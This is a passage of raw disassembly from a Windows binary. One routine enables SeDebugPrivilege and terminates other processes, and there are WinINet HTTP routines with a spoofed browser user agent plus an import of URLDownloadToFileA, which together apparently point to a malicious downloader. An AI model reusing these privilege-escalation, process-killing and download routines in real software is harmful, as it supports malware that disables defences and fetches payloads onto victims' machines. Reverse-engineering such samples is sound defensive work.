                push    0               ; ReturnLength
                push    0               ; PreviousState
                push    0               ; BufferLength
                lea     ecx, [esp+60h+NewState]
                push    ecx             ; NewState
                mov     [esp+64h+NewState.Privileges.Luid.LowPart], edx
                mov     edx, [esp+64h+TokenHandle]
                push    0               ; DisableAllPrivileges
                push    edx             ; TokenHandle
                mov     [esp+6Ch+NewState.PrivilegeCount], ebx
                mov     [esp+6Ch+NewState.Privileges.Luid.HighPart], eax
                mov     [esp+6Ch+NewState.Privileges.Attributes], 2
                call    ds:AdjustTokenPrivileges
                mov     eax, [esp+54h+TokenHandle]
                push    eax             ; hObject
                call    ds:CloseHandle
                call    ds:GetLastError

loc_40DE2F:                             ; CODE XREF: sub_40DD30+A2↑j
                                        ; sub_40DD30+B8↑j
                push    edi             ; dwProcessId
                push    1               ; bInheritHandle
                push    1FFFFFh         ; dwDesiredAccess
                call    ds:OpenProcess
                mov     edi, eax
                test    edi, edi
                jz      short loc_40DE5D
                push    0               ; uExitCode
                push    edi             ; hProcess
                call    ds:TerminateProcess
                mov     ebx, eax
                test    ebx, ebx
                jnz     short loc_40DE5D
                push    1F4h            ; dwMilliseconds
                call    ds:Sleep

loc_40DE5D:                             ; CODE XREF: sub_40DD30+111↑j
                                        ; sub_40DD30+120↑j
                push    edi             ; hObject
                mov     edi, ds:CloseHandle
                call    edi ; CloseHandle
                lea     ecx, [esp+54h+hObject]
                push    ecx             ; TokenHandle
                push    20028h          ; DesiredAccess
                call    ds:GetCurrentProcess
                push    eax             ; ProcessHandle
                call    ebp ; OpenProcessToken
                test    eax, eax
                jz      short loc_40DED8
                lea     edx, [esp+54h+var_2C]
                push    edx             ; lpLuid
                push    offset aSedebugprivile ; "SeDebugPrivilege"
                push    0               ; lpSystemName
                call    ds:LookupPrivilegeValueA
                test    eax, eax
                jz      short loc_40DED8
                mov     eax, [esp+54h+var_2C.LowPart]
                mov     ecx, [esp+54h+var_2C.HighPart]
                push    0               ; ReturnLength
                push    0               ; PreviousState
                push    0               ; BufferLength
                lea     edx, [esp+60h+var_14]
                push    edx             ; NewState
                mov     [esp+64h+var_14.Privileges.Luid.LowPart], eax
                mov     eax, [esp+64h+hObject]
                push    0               ; DisableAllPrivileges
                push    eax             ; TokenHandle
                mov     [esp+6Ch+var_14.PrivilegeCount], 1
                mov     [esp+6Ch+var_14.Privileges.Luid.HighPart], ecx
                mov     [esp+6Ch+var_14.Privileges.Attributes], 0
                call    ds:AdjustTokenPrivileges
                mov     ecx, [esp+54h+hObject]
                push    ecx             ; hObject
                call    edi ; CloseHandle
                call    ds:GetLastError

loc_40DED8:                             ; CODE XREF: sub_40DD30+14B↑j
                                        ; sub_40DD30+161↑j
                mov     ebp, ebx

loc_40DEDA:                             ; CODE XREF: sub_40DD30+78↑j
                mov     eax, [esi+4]
                mov     edx, [eax]
                add     edx, eax
                cmp     [esp+54h+var_38], 0
                mov     [esi+4], edx
                jz      loc_40DD73
                mov     eax, [esp+54h+lpWideCharStr]
                push    eax
                call    sub_40F15B
                add     esp, 4
                pop     edi
                pop     esi
                mov     eax, ebp
                pop     ebp
                pop     ebx
                add     esp, 44h
                retn
sub_40DD30      endp

; ---------------------------------------------------------------------------
                align 10h
; START OF FUNCTION CHUNK FOR sub_41F100

loc_40DF10:                             ; CODE XREF: sub_41F100+6↓j
                mov     eax, [esi+8]
                push    edi
                mov     edi, ds:InternetCloseHandle
                test    eax, eax
                jz      short loc_40DF28
                push    eax             ; hInternet
                call    edi ; InternetCloseHandle
                mov     dword ptr [esi+8], 0

loc_40DF28:                             ; CODE XREF: sub_41F100-111E4↑j
                mov     eax, [esi+4]
                test    eax, eax
                jz      short loc_40DF39
                push    eax             ; hInternet
                call    edi ; InternetCloseHandle
                mov     dword ptr [esi+4], 0

loc_40DF39:                             ; CODE XREF: sub_41F100-111D3↑j
                pop     edi
                retn
; END OF FUNCTION CHUNK FOR sub_41F100
; ---------------------------------------------------------------------------
                align 10h

; =============== S U B R O U T I N E =======================================


sub_40DF40      proc near               ; CODE XREF: sub_401E10+61↑p
                push    ecx
                mov     eax, offset szProxyBypass
                lea     edx, [eax+1]
                lea     esp, [esp+0]

loc_40DF50:                             ; CODE XREF: sub_40DF40+15↓j
                mov     cl, [eax]
                inc     eax
                test    cl, cl
                jnz     short loc_40DF50
                sub     eax, edx
                push    0               ; dwFlags
                jz      short loc_40DF68
                push    0
                push    offset szProxyBypass
                push    3
                jmp     short loc_40DF74
; ---------------------------------------------------------------------------

loc_40DF68:                             ; CODE XREF: sub_40DF40+1B↑j
                push    offset szProxyBypass ; lpszProxyBypass
                push    offset szProxyBypass ; lpszProxy
                push    0               ; dwAccessType

loc_40DF74:                             ; CODE XREF: sub_40DF40+26↑j
                push    offset szAgent  ; "Mozilla/4.0 (compatible; MSIE 8.0; Wind"...
                call    ds:InternetOpenA
                mov     [esi+4], eax
                test    eax, eax
                jnz     short loc_40DFB4
                mov     eax, [esi+8]
                push    edi
                mov     edi, ds:InternetCloseHandle
                test    eax, eax
                jz      short loc_40DF9E
                push    eax             ; hInternet
                call    edi ; InternetCloseHandle
                mov     dword ptr [esi+8], 0

loc_40DF9E:                             ; CODE XREF: sub_40DF40+52↑j
                mov     eax, [esi+4]
                test    eax, eax
                jz      short loc_40DFAF
                push    eax             ; hInternet
                call    edi ; InternetCloseHandle
                mov     dword ptr [esi+4], 0

loc_40DFAF:                             ; CODE XREF: sub_40DF40+63↑j
                xor     eax, eax
                pop     edi
                pop     ecx
                retn
; ---------------------------------------------------------------------------

loc_40DFB4:                             ; CODE XREF: sub_40DF40+44↑j
                mov     eax, 1
                pop     ecx
                retn
sub_40DF40      endp

; ---------------------------------------------------------------------------
                align 10h

; =============== S U B R O U T I N E =======================================


; int __thiscall sub_40DFC0(LPCSTR lpszVerb, int)
sub_40DFC0      proc near               ; CODE XREF: sub_402A00+3C0↑p
                                        ; .text:00403249↑p ...

var_C           = dword ptr -0Ch
dwBufferLength  = dword ptr -8
Buffer          = dword ptr -4
arg_0           = dword ptr  4

                sub     esp, 0Ch
                push    ebx
                push    esi
                push    edi
                mov     edi, [esp+18h+arg_0]
                or      ebx, 0FFFFFFFFh
                mov     [esp+18h+arg_0], ebx
                mov     [esp+18h+var_C], ebx
                push    0               ; dwContext
                test    edi, edi
                jz      short loc_40DFF1
                push    84880000h
                push    0
                push    0
                push    offset szVersion ; "HTTP/1.0"
                push    eax
                mov     eax, [edx+8]
                push    ecx
                push    eax
                jmp     short loc_40E005
; ---------------------------------------------------------------------------

loc_40DFF1:                             ; CODE XREF: sub_40DFC0+19↑j
                push    84080000h       ; dwFlags
                push    0               ; lplpszAcceptTypes
                push    0               ; lpszReferrer
                push    offset szVersion ; "HTTP/1.0"
                push    eax             ; lpszObjectName
                push    ecx             ; lpszVerb
                mov     ecx, [edx+8]
                push    ecx             ; hConnect

loc_40E005:                             ; CODE XREF: sub_40DFC0+2F↑j
                call    ds:HttpOpenRequestA
                mov     esi, eax
                test    esi, esi
                jnz     short loc_40E01C

loc_40E011:                             ; CODE XREF: sub_40DFC0+BF↓j
                                        ; sub_40DFC0+D5↓j
                pop     edi
                pop     esi
                xor     eax, eax
                pop     ebx
                add     esp, 0Ch
                retn    4
; ---------------------------------------------------------------------------

loc_40E01C:                             ; CODE XREF: sub_40DFC0+4F↑j
                test    edi, edi
                mov     edi, ds:InternetSetOptionA
                jz      short loc_40E057
                lea     edx, [esp+18h+dwBufferLength]
                push    edx             ; lpdwBufferLength
                push    offset dword_42BF9C ; lpBuffer
                push    1Fh             ; dwOption
                push    esi             ; hInternet
                mov     [esp+28h+dwBufferLength], 4
                call    ds:InternetQueryOptionA
                or      dword_42BF9C, 3180h
                push    4               ; dwBufferLength
                push    offset dword_42BF9C ; lpBuffer
                push    1Fh             ; dwOption
                push    esi             ; hInternet
                call    edi ; InternetSetOptionA

loc_40E057:                             ; CODE XREF: sub_40DFC0+64↑j
                push    4               ; dwBufferLength
                lea     eax, [esp+1Ch+Buffer]
                push    eax             ; lpBuffer
                push    41h             ; dwOption
                push    esi             ; hInternet
                mov     [esp+28h+Buffer], 0
                call    edi ; InternetSetOptionA
                cmp     [esp+18h+arg_0], ebx
                jz      short loc_40E081
                push    4               ; dwBufferLength
                lea     ecx, [esp+1Ch+arg_0]
                push    ecx             ; lpBuffer
                push    6               ; dwOption
                push    esi             ; hInternet
                call    edi ; InternetSetOptionA
                test    eax, eax
                jz      short loc_40E011

loc_40E081:                             ; CODE XREF: sub_40DFC0+AF↑j
                cmp     [esp+18h+var_C], ebx
                jz      short loc_40E09B
                push    4               ; dwBufferLength
                lea     edx, [esp+1Ch+var_C]
                push    edx             ; lpBuffer
                push    5               ; dwOption
                push    esi             ; hInternet
                call    edi ; InternetSetOptionA
                test    eax, eax
                jz      loc_40E011

loc_40E09B:                             ; CODE XREF: sub_40DFC0+C5↑j
                pop     edi
                mov     eax, esi
                pop     esi
                pop     ebx
                add     esp, 0Ch
                retn    4
sub_40DFC0      endp

; ---------------------------------------------------------------------------
                align 10h

; =============== S U B R O U T I N E =======================================


sub_40E0B0      proc near               ; CODE XREF: sub_402A00+450↑p
                                        ; sub_402A00+45F↑p ...

szHeaders       = byte ptr -404h
var_403         = byte ptr -403h
var_4           = dword ptr -4

                sub     esp, 404h
                mov     eax, ___security_cookie
                xor     eax, esp
                mov     [esp+404h+var_4], eax
                push    3FFh
                lea     eax, [esp+408h+var_403]
                push    0
                push    eax
                mov     [esp+410h+szHeaders], 0
                call    sub_413520
                push    ebx
                push    edi
                lea     ecx, [esp+418h+szHeaders]
                push    offset aSS      ; "%s: %s"
                push    ecx
                call    sub_40E37C
                add     esp, 1Ch
                push    0A0000000h      ; dwModifiers
                push    0FFFFFFFFh      ; dwHeadersLength
                lea     edx, [esp+40Ch+szHeaders]
                push    edx             ; lpszHeaders
                push    esi             ; hRequest
                call    ds:HttpAddRequestHeadersA
                mov     ecx, [esp+404h+var_4]
                xor     ecx, esp
                call    @__security_check_cookie@4 ; __security_check_cookie(x)
                add     esp, 404h
                retn
sub_40E0B0      endp

; ---------------------------------------------------------------------------
                align 10h

; =============== S U B R O U T I N E =======================================

; Attributes: bp-based frame fuzzy-sp

sub_40E120      proc near               ; CODE XREF: .text:00403373↑p

BuffersIn       = _INTERNET_BUFFERSA ptr -28h
arg_0           = dword ptr  8

                push    ebp
                mov     ebp, esp
                and     esp, 0FFFFFFF8h
                sub     esp, 2Ch
                push    esi
                mov     esi, dword_42C7A8
                xor     eax, eax
                push    0               ; dwContext
                push    8               ; dwFlags
                push    0               ; lpBuffersOut
                lea     ecx, [esp+3Ch+BuffersIn]
                mov     [esp+3Ch+BuffersIn.dwBufferTotal], eax
                mov     [esp+3Ch+BuffersIn.Next], eax
                mov     [esp+3Ch+BuffersIn.lpcszHeader], eax
                mov     [esp+3Ch+BuffersIn.dwHeadersLength], eax
                mov     [esp+3Ch+BuffersIn.dwHeadersTotal], eax
                mov     [esp+3Ch+BuffersIn.lpvBuffer], eax
                mov     [esp+3Ch+BuffersIn.dwBufferLength], eax
                mov     [esp+3Ch+BuffersIn.dwOffsetLow], eax
                mov     [esp+3Ch+BuffersIn.dwOffsetHigh], eax
                mov     eax, [ebp+arg_0]
                push    ecx             ; lpBuffersIn
                push    edx             ; hRequest
                mov     [esp+44h+BuffersIn.dwStructSize], 28h
                mov     [esp+44h+BuffersIn.dwBufferTotal], eax
                call    ds:HttpSendRequestExA
                test    eax, eax
                jz      short loc_40E187
                mov     eax, 1
                pop     esi
                mov     esp, ebp
                pop     ebp
                retn    4
; ---------------------------------------------------------------------------

loc_40E187:                             ; CODE XREF: sub_40E120+59↑j
                call    ds:GetLastError
                mov     [esi], eax
                xor     eax, eax
                pop     esi
                mov     esp, ebp
                pop     ebp
                retn    4
sub_40E120      endp

; ---------------------------------------------------------------------------
                align 10h

; =============== S U B R O U T I N E =======================================


sub_40E1A0      proc near               ; CODE XREF: sub_404940+1EC↑p

dwIndex         = dword ptr -8
dwBufferLength  = dword ptr -4
hRequest        = dword ptr  4

                sub     esp, 8
                lea     eax, [esp+8+dwIndex]
                push    eax             ; lpdwIndex
                mov     eax, [esp+0Ch+hRequest]
                lea     ecx, [esp+0Ch+dwBufferLength]
                push    ecx             ; lpdwBufferLength
                push    edx             ; lpBuffer
                push    20000005h       ; dwInfoLevel
                push    eax             ; hRequest
                mov     [esp+1Ch+dwIndex], 0
                mov     [esp+1Ch+dwBufferLength], 4
                call    ds:HttpQueryInfoA
                add     esp, 8
                retn    4
sub_40E1A0      endp

; ---------------------------------------------------------------------------
                align 10h

; =============== S U B R O U T I N E =======================================


sub_40E1E0      proc near               ; CODE XREF: sub_401E10+5FC↑p

dwIndex         = dword ptr -4
dwBufferLength  = dword ptr  4

                push    ecx
                xor     eax, eax
                push    ebp
                mov     ebp, [esp+8+dwBufferLength]
                mov     [esp+8+dwIndex], eax
                mov     [esp+8+dwBufferLength], eax
                cmp     ebp, eax
                jnz     short loc_40E1F9
                pop     ebp
                pop     ecx
                retn    4
; ---------------------------------------------------------------------------

loc_40E1F9:                             ; CODE XREF: sub_40E1E0+12↑j
                push    esi
                mov     esi, ds:HttpQueryInfoA
                lea     ecx, [esp+0Ch+dwIndex]
                push    ecx             ; lpdwIndex
                lea     edx, [esp+10h+dwBufferLength]
                push    edx             ; lpdwBufferLength
                push    eax             ; lpBuffer
                push    1               ; dwInfoLevel
                push    ebx             ; hRequest
                call    esi ; HttpQueryInfoA
                mov     eax, [esp+0Ch+dwBufferLength]
                cmp     eax, [edi]
                ja      short loc_40E235
                call    ds:GetLastError
                cmp     eax, 7Ah
                jnz     short loc_40E235
                lea     ecx, [esp+0Ch+dwIndex]
                push    ecx             ; lpdwIndex
                push    edi             ; lpdwBufferLength
                push    ebp             ; lpBuffer
                push    1               ; dwInfoLevel
                push    ebx             ; hRequest
                call    esi ; HttpQueryInfoA
                pop     esi
                pop     ebp
                pop     ecx
                retn    4
; ---------------------------------------------------------------------------

loc_40E235:                             ; CODE XREF: sub_40E1E0+36↑j
                                        ; sub_40E1E0+41↑j
                pop     esi
                xor     eax, eax
                pop     ebp
                pop     ecx
                retn    4
sub_40E1E0      endp

; ---------------------------------------------------------------------------
                align 10h

; =============== S U B R O U T I N E =======================================


; int __fastcall sub_40E240(DWORD dwNumberOfBytesToRead, LPVOID lpBuffer, int, HINTERNET hFile)
sub_40E240      proc near               ; CODE XREF: sub_401E10+5A6↑p

arg_0           = dword ptr  4
hFile           = dword ptr  8

                push    eax             ; lpdwNumberOfBytesRead
                mov     eax, [esp+4+hFile]
                push    ecx             ; dwNumberOfBytesToRead
                push    edx             ; lpBuffer
                push    eax             ; hFile
                call    ds:InternetReadFile
                test    eax, eax
                jnz     short loc_40E263
                call    ds:GetLastError
                mov     ecx, [esp+arg_0]
                mov     [ecx], eax
                xor     eax, eax
                retn    8
; ---------------------------------------------------------------------------

loc_40E263:                             ; CODE XREF: sub_40E240+10↑j
                mov     eax, 1
                retn    8
sub_40E240      endp


; =============== S U B R O U T I N E =======================================

; Attributes: noreturn bp-based frame

sub_40E26B      proc near               ; CODE XREF: sub_408C10+B↑p
                                        ; sub_408C10+1A↑p ...

var_50          = byte ptr -50h
var_28          = byte ptr -28h
var_4           = dword ptr -4
arg_4           = dword ptr  0Ch

; FUNCTION CHUNK AT 0041E668 SIZE 0000001B BYTES

                push    44h
                mov     eax, offset loc_41E668
                call    __EH_prolog3
                push    offset aStringTooLong ; "string too long"
                lea     ecx, [ebp+var_28]
                call    sub_408560
                and     [ebp+var_4], 0
                lea     eax, [ebp+var_28]
                push    eax
                lea     ecx, [ebp+var_50]
                call    sub_401150
                push    offset unk_423344
                lea     eax, [ebp+var_50]
                push    eax
                call    sub_41032B
                int     3               ; Trap to Debugger
sub_40E26B      endp


; =============== S U B R O U T I N E =======================================

; Attributes: noreturn bp-based frame

sub_40E2A3      proc near               ; CODE XREF: sub_408CA0+13↑p
                                        ; sub_409640+12↑p ...

var_50          = byte ptr -50h
var_28          = byte ptr -28h
var_4           = dword ptr -4

; FUNCTION CHUNK AT 0041E668 SIZE 0000001B BYTES

                push    44h
                mov     eax, offset loc_41E668
                call    __EH_prolog3
                push    offset aInvalidStringP ; "invalid string position"
                lea     ecx, [ebp+var_28]
                call    sub_408560
                and     [ebp+var_4], 0
                lea     eax, [ebp+var_28]
                push    eax
                lea     ecx, [ebp+var_50]
                call    sub_401200
                push    offset unk_423308
                lea     eax, [ebp+var_50]
                push    eax
                call    sub_41032B
                int     3               ; Trap to Debugger
sub_40E2A3      endp


; =============== S U B R O U T I N E =======================================

; Attributes: bp-based frame

sub_40E2DB      proc near               ; CODE XREF: sub_404940+129↑p
                mov     edi, edi
                push    ebp
                mov     ebp, esp
                pop     ebp
                jmp     sub_40F94F
sub_40E2DB      endp

; [00000006 BYTES: COLLAPSED FUNCTION WS2_32_52. PRESS CTRL-NUMPAD+ TO EXPAND]
; [00000006 BYTES: COLLAPSED FUNCTION WS2_32_111. PRESS CTRL-NUMPAD+ TO EXPAND]
; [00000006 BYTES: COLLAPSED FUNCTION WS2_32_11. PRESS CTRL-NUMPAD+ TO EXPAND]
; [00000006 BYTES: COLLAPSED FUNCTION WS2_32_115. PRESS CTRL-NUMPAD+ TO EXPAND]
; [00000006 BYTES: COLLAPSED FUNCTION WS2_32_12. PRESS CTRL-NUMPAD+ TO EXPAND]
; [00000006 BYTES: COLLAPSED FUNCTION WS2_32_57. PRESS CTRL-NUMPAD+ TO EXPAND]
; [00000006 BYTES: COLLAPSED FUNCTION URLDownloadToFileA. PRESS CTRL-NUMPAD+ TO EXPAND]
; [0000000F BYTES: COLLAPSED FUNCTION __security_check_cookie(x). PRESS CTRL-NUMPAD+ TO EXPAND]

; =============== S U B R O U T I N E =======================================

; Attributes: bp-based frame

sub_40E31F      proc near               ; CODE XREF: sub_409920+5D↑p
                                        ; sub_409E20+92↑p ...

arg_0           = dword ptr  8
arg_4           = dword ptr  0Ch
arg_8           = dword ptr  10h
arg_C           = dword ptr  14h

                mov     edi, edi
                push    ebp
                mov     ebp, esp
                mov     eax, [ebp+arg_C]
                push    esi
                push    edi
                xor     edi, edi
                cmp     eax, edi
                jz      short loc_40E376
                cmp     [ebp+arg_0], edi
                jnz     short loc_40E34F

loc_40E334:                             ; CODE XREF: sub_40E31F+33↓j
                call    sub_41090E
                push    16h
                pop     esi
                mov     [eax], esi

loc_40E33E:                             ; CODE XREF: sub_40E31F+46↓j
                push    edi
                push    edi
                push    edi
                push    edi
                push    edi
                call    sub_40EC54
                add     esp, 14h
                mov     eax, esi
                jmp     short loc_40E378
; ---------------------------------------------------------------------------

loc_40E34F:                             ; CODE XREF: sub_40E31F+13↑j
                cmp     [ebp+arg_8], edi
                jz      short loc_40E334
                cmp     [ebp+arg_4], eax
                jnb     short loc_40E367
                call    sub_41090E
                push    22h
                pop     ecx
                mov     [eax], ecx
                mov     esi, ecx
                jmp     short loc_40E33E
; ---------------------------------------------------------------------------

loc_40E367:                             ; CODE XREF: sub_40E31F+38↑j
                push    eax
                push    [ebp+arg_8]
                push    [ebp+arg_0]
                call    sub_40F9F0
                add     esp, 0Ch

loc_40E376:                             ; CODE XREF: sub_40E31F+E↑j
                xor     eax, eax

loc_40E378:                             ; CODE XREF: sub_40E31F+2E↑j
                pop     edi
                pop     esi
                pop     ebp
                retn
sub_40E31F      endp


; =============== S U B R O U T I N E =======================================

; Attributes: bp-based frame

sub_40E37C      proc near               ; CODE XREF: sub_401E10+29C↑p
                                        ; sub_401E10+2F0↑p ...

var_20          = dword ptr -20h
var_1C          = dword ptr -1Ch
var_18          = dword ptr -18h
var_14          = dword ptr -14h
arg_0           = dword ptr  8
arg_4           = dword ptr  0Ch
arg_8           = byte ptr  10h

                mov     edi, edi
                push    ebp
                mov     ebp, esp
                sub     esp, 20h
                push    ebx
                xor     ebx, ebx
                cmp     [ebp+arg_4], ebx
                jnz     short loc_40E3A9

loc_40E38C:                             ; CODE XREF: sub_40E37C+32↓j
                call    sub_41090E
                push    ebx
                push    ebx
                push    ebx
                push    ebx
                push    ebx
                mov     dword ptr [eax], 16h
                call    sub_40EC54
                add     esp, 14h
                or      eax, 0FFFFFFFFh
                jmp     short loc_40E3F6
; ---------------------------------------------------------------------------

loc_40E3A9:                             ; CODE XREF: sub_40E37C+E↑j
                mov     eax, [ebp+arg_0]
                cmp     eax, ebx
                jz      short loc_40E38C
                push    esi
                mov     [ebp+var_18], eax
                mov     [ebp+var_20], eax
                lea     eax, [ebp+arg_8]
                push    eax
                push    ebx
                push    [ebp+arg_4]
                lea     eax, [ebp+var_20]
                push    eax
                mov     [ebp+var_1C], 7FFFFFFFh
                mov     [ebp+var_14], 42h
                call    sub_410B61
                add     esp, 10h
                dec     [ebp+var_1C]
                mov     esi, eax
                js      short loc_40E3E7
                mov     eax, [ebp+var_20]
                mov     [eax], bl
                jmp     short loc_40E3F3
; ---------------------------------------------------------------------------

loc_40E3E7:                             ; CODE XREF: sub_40E37C+62↑j
                lea     eax, [ebp+var_20]
                push    eax
                push    ebx
                call    sub_410957
                pop     ecx
                pop     ecx

loc_40E3F3:                             ; CODE XREF: sub_40E37C+69↑j
                mov     eax, esi
                pop     esi

loc_40E3F6:                             ; CODE XREF: sub_40E37C+2B↑j
                pop     ebx
                leave
                retn
sub_40E37C      endp


; =============== S U B R O U T I N E =======================================

; Attributes: bp-based frame

sub_40E3F9      proc near               ; CODE XREF: .text:004033CA↑p
                                        ; .text:00403474↑p ...

arg_0           = dword ptr  8

                mov     edi, edi
                push    ebp
                mov     ebp, esp
                mov     eax, [ebp+arg_0]
                push    esi
                xor     esi, esi
                cmp     eax, esi
                jnz     short loc_40E424
                call    sub_41090E
                push    esi
                push    esi
                push    esi
                push    esi
                push    esi
                mov     dword ptr [eax], 16h
                call    sub_40EC54
                add     esp, 14h
                xor     eax, eax
                jmp     short loc_40E42A
; ---------------------------------------------------------------------------

loc_40E424:                             ; CODE XREF: sub_40E3F9+D↑j
                mov     eax, [eax+0Ch]
                and     eax, 10h

loc_40E42A:                             ; CODE XREF: sub_40E3F9+29↑j
                pop     esi
                pop     ebp
                retn
sub_40E3F9      endp


; =============== S U B R O U T I N E =======================================

; Attributes: bp-based frame

sub_40E42D      proc near               ; CODE XREF: .text:00403409↑p
                                        ; sub_404BF0+153↑p

arg_0           = dword ptr  8

                mov     edi, edi
                push    ebp
                mov     ebp, esp
                mov     eax, [ebp+arg_0]
                push    esi
                xor     esi, esi
                cmp     eax, esi
                jnz     short loc_40E458
                call    sub_41090E
                push    esi
                push    esi
                push    esi
                push    esi
                push    esi
                mov     dword ptr [eax], 16h
                call    sub_40EC54
                add     esp, 14h
                xor     eax, eax
                jmp     short loc_40E45E
; ---------------------------------------------------------------------------

loc_40E458:                             ; CODE XREF: sub_40E42D+D↑j
                mov     eax, [eax+0Ch]
                and     eax, 20h

loc_40E45E:                             ; CODE XREF: sub_40E42D+29↑j
                pop     esi
                pop     ebp
                retn
sub_40E42D      endp


; =============== S U B R O U T I N E =======================================

; Attributes: bp-based frame

sub_40E461      proc near               ; CODE XREF: sub_40E4E8+1C↓p
                                        ; sub_40ED65+E↓p ...

arg_0           = dword ptr  8

                mov     edi, edi
                push    ebp
                mov     ebp, esp
                mov     eax, [ebp+arg_0]
                push    esi
                mov     esi, ecx
                mov     byte ptr [esi+0Ch], 0
                test    eax, eax
                jnz     short loc_40E4D7
                call    sub_412405
                mov     [esi+8], eax
                mov     ecx, [eax+6Ch]
                mov     [esi], ecx
                mov     ecx, [eax+68h]
                mov     [esi+4], ecx
                mov     ecx, [esi]
                cmp     ecx, off_4257C8
                jz      short loc_40E4A3
                mov     ecx, dword_4256E4
                test    [eax+70h], ecx
                jnz     short loc_40E4A3
                call    sub_41208B
                mov     [esi], eax

loc_40E4A3:                             ; CODE XREF: sub_40E461+2E↑j
                                        ; sub_40E461+39↑j
                mov     eax, [esi+4]
                cmp     eax, lpAddend
                jz      short loc_40E4C4
                mov     eax, [esi+8]
                mov     ecx, dword_4256E4
                test    [eax+70h], ecx
                jnz     short loc_40E4C4
                call    sub_41191F
                mov     [esi+4], eax

loc_40E4C4:                             ; CODE XREF: sub_40E461+4B↑j
                                        ; sub_40E461+59↑j
                mov     eax, [esi+8]
                test    byte ptr [eax+70h], 2
                jnz     short loc_40E4E1
                or      dword ptr [eax+70h], 2
                mov     byte ptr [esi+0Ch], 1
                jmp     short loc_40E4E1
; ---------------------------------------------------------------------------

loc_40E4D7:                             ; CODE XREF: sub_40E461+11↑j
                mov     ecx, [eax]
                mov     [esi], ecx
                mov     eax, [eax+4]
                mov     [esi+4], eax

loc_40E4E1:                             ; CODE XREF: sub_40E461+6A↑j
                                        ; sub_40E461+74↑j
                mov     eax, esi
                pop     esi
                pop     ebp
                retn    4
sub_40E461      endp


; =============== S U B R O U T I N E =======================================

; Attributes: bp-based frame

sub_40E4E8      proc near               ; CODE XREF: sub_40E5DA+53↓p

var_10          = dword ptr -10h
var_8           = dword ptr -8
var_4           = byte ptr -4
arg_0           = dword ptr  8
arg_4           = dword ptr  0Ch
arg_8           = dword ptr  10h
arg_C           = dword ptr  14h

                mov     edi, edi
                push    ebp
                mov     ebp, esp
                sub     esp, 10h
                push    ebx
                xor     ebx, ebx
                push    esi
                push    edi
                cmp     [ebp+arg_8], ebx
                jz      loc_40E5D3
                push    [ebp+arg_C]
                lea     ecx, [ebp+var_10]
                call    sub_40E461
                cmp     [ebp+arg_0], ebx
                jnz     short loc_40E53C

loc_40E50E:                             ; CODE XREF: sub_40E4E8+59↓j
                call    sub_41090E
                push    ebx
                push    ebx
                push    ebx
                push    ebx
                push    ebx
                mov     dword ptr [eax], 16h
                call    sub_40EC54
                add     esp, 14h
                cmp     [ebp+var_4], bl
                jz      short loc_40E532
                mov     eax, [ebp+var_8]
                and     dword ptr [eax+70h], 0FFFFFFFDh

loc_40E532:                             ; CODE XREF: sub_40E4E8+41↑j
                mov     eax, 7FFFFFFFh
                jmp     loc_40E5D5
; ---------------------------------------------------------------------------

loc_40E53C:                             ; CODE XREF: sub_40E4E8+24↑j
                mov     edi, [ebp+arg_4]
                cmp     edi, ebx
                jz      short loc_40E50E
                mov     esi, 7FFFFFFFh
                cmp     [ebp+arg_8], esi
                jbe     short loc_40E575
                call    sub_41090E
                push    ebx
                push    ebx
                push    ebx
                push    ebx
                push    ebx
                mov     dword ptr [eax], 16h
                call    sub_40EC54
                add     esp, 14h
                cmp     [ebp+var_4], bl
                jz      short loc_40E571
                mov     eax, [ebp+var_8]
                and     dword ptr [eax+70h], 0FFFFFFFDh

loc_40E571:                             ; CODE XREF: sub_40E4E8+80↑j
                mov     eax, esi
                jmp     short loc_40E5D5
; ---------------------------------------------------------------------------

loc_40E575:                             ; CODE XREF: sub_40E4E8+63↑j
                mov     eax, [ebp+var_10]
                cmp     [eax+14h], ebx
                jnz     short loc_40E59A
                push    [ebp+arg_8]
                push    edi
                push    [ebp+arg_0]
                call    sub_412890
                add     esp, 0Ch

loc_40E58C:                             ; CODE XREF: sub_40E4E8+E9↓j
                cmp     [ebp+var_4], bl
                jz      short loc_40E5D5
                mov     ecx, [ebp+var_8]
                and     dword ptr [ecx+70h], 0FFFFFFFDh
                jmp     short loc_40E5D5
; ---------------------------------------------------------------------------

loc_40E59A:                             ; CODE XREF: sub_40E4E8+93↑j
                                        ; sub_40E4E8+E3↓j
                mov     eax, [ebp+arg_0]
                movzx   eax, byte ptr [eax]
                lea     ecx, [ebp+var_10]
                push    ecx
                push    eax
                call    sub_412749
                inc     [ebp+arg_0]
                mov     esi, eax
                movzx   eax, byte ptr [edi]
                lea     ecx, [ebp+var_10]
                push    ecx
                push    eax
                call    sub_412749
                add     esp, 10h
                inc     edi
                dec     [ebp+arg_8]
                jz      short loc_40E5CD
                cmp     esi, ebx
                jz      short loc_40E5CD
                cmp     esi, eax
                jz      short loc_40E59A

loc_40E5CD:                             ; CODE XREF: sub_40E4E8+DB↑j
                                        ; sub_40E4E8+DF↑j
                sub     esi, eax
                mov     eax, esi
                jmp     short loc_40E58C
; ---------------------------------------------------------------------------

loc_40E5D3:                             ; CODE XREF: sub_40E4E8+10↑j
                xor     eax, eax

loc_40E5D5:                             ; CODE XREF: sub_40E4E8+4F↑j
                                        ; sub_40E4E8+8B↑j ...
                pop     edi
                pop     esi
                pop     ebx
                leave
                retn
sub_40E4E8      endp


; =============== S U B R O U T I N E =======================================

; Attributes: bp-based frame

sub_40E5DA      proc near               ; CODE XREF: sub_4052B0+199↑p
                                        ; sub_4052B0+1BE↑p ...

arg_0           = dword ptr  8
arg_4           = dword ptr  0Ch
arg_8           = dword ptr  10h

                mov     edi, edi
                push    ebp
                mov     ebp, esp
                push    esi
                xor     esi, esi
                cmp     dword_42AE20, esi
                jnz     short loc_40E623
                cmp     [ebp+arg_0], esi
                jnz     short loc_40E60E

loc_40E5EF:                             ; CODE XREF: sub_40E5DA+37↓j
                                        ; sub_40E5DA+40↓j
                call    sub_41090E
                push    esi
                push    esi
                push    esi
                push    esi
                push    esi
                mov     dword ptr [eax], 16h
                call    sub_40EC54
                add     esp, 14h
                mov     eax, 7FFFFFFFh
                jmp     short loc_40E635
; ---------------------------------------------------------------------------

loc_40E60E:                             ; CODE XREF: sub_40E5DA+13↑j
                cmp     [ebp+arg_4], esi
                jz      short loc_40E5EF
                cmp     [ebp+arg_8], 7FFFFFFFh
                ja      short loc_40E5EF
                pop     esi
                pop     ebp
                jmp     sub_412890
; ---------------------------------------------------------------------------

loc_40E623:                             ; CODE XREF: sub_40E5DA+E↑j
                push    esi
                push    [ebp+arg_8]
                push    [ebp+arg_4]
                push    [ebp+arg_0]
                call    sub_40E4E8
                add     esp, 10h

